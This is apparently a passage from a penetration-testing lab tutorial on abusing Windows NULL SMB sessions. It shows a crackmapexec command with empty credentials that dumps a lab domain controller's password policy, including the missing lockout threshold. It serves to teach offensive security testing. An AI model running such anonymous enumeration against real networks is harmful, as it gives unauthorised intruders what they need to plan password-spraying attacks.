# Exploiting NULL/Anonymous Sessions

A [NULL Session](https://en.wikipedia.org/wiki/Null_session) is an anonymous connection to an inter-process communication network service on Windows-based computers. The service is designed to allow named pipe connections but may be used by attackers to gather information about the system remotely.

When a target is vulnerable to a `NULL Session`, especially a domain controller, it will allow the attacker to gather information without having a valid domain account, such as:

* Domain users (`--users`)
* Domain groups (`--groups`)
* Password policy (`--pass-pol`)
* Share folders (`--shares`)

Let's try it on a domain controller using the following commands:

### **Enumerating the Password Policy**

```
$ crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] Dumping password info for domain: INLANEFREIGHT
SMB         10.129.203.121  445    DC01             Minimum password length: 7
SMB         10.129.203.121  445    DC01             Password history length: 24
SMB         10.129.203.121  445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.129.203.121  445    DC01             
SMB         10.129.203.121  445    DC01             Password Complexity Flags: 000001
SMB         10.129.203.121  445    DC01                 Domain Refuse Password Change: 0
SMB         10.129.203.121  445    DC01                 Domain Password Store Cleartext: 0
SMB         10.129.203.121  445    DC01                 Domain Password Lockout Admins: 0
SMB         10.129.203.121  445    DC01                 Domain Password No Clear Change: 0
SMB         10.129.203.121  445    DC01                 Domain Password No Anon Change: 0
SMB         10.129.203.121  445    DC01                 Domain Password Complex: 1
SMB         10.129.203.121  445    DC01             
SMB         10.129.203.121  445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.129.203.121  445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.129.203.121  445    DC01             Locked Account Duration: 30 minutes 
SMB         10.129.203.121  445    DC01             Account Lockout Threshold: None
SMB         10.129.203.121  445    DC01             Forced Log off Time: Not Set
```
